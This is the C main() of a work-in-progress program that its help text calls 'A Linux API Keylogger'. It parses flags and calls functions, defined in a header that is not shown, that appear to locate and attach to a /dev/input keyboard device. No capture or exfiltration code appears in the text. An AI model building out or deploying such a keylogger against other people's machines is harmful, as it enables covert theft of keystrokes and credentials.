#include<stdio.h>
#include"logger.h"


int main(int argc ,char *argv[]){
    int verbose = 0;
    char device[MAX_SIZE] = "none";
    char handler[MAX_SIZE] = "none";

    for(int i = 0 ; i < argc ; i++){
        if(strcmp(argv[i],"-v") == 0){
            verbose = 1;
        }

        if(strcmp(argv[i],"--h") == 0 || strcmp(argv[i],"--help") == 0){
            printf("A Linux API Keylogger\n");
            printf("WIP :)\n");
            exit(0);
        }
    }

    get_handler(device,handler,verbose);
    connect_handler(handler,verbose);

    // printf("Device : %s\n",device);
    // printf("/dev/input/%s\n",handler);
    return 0;
}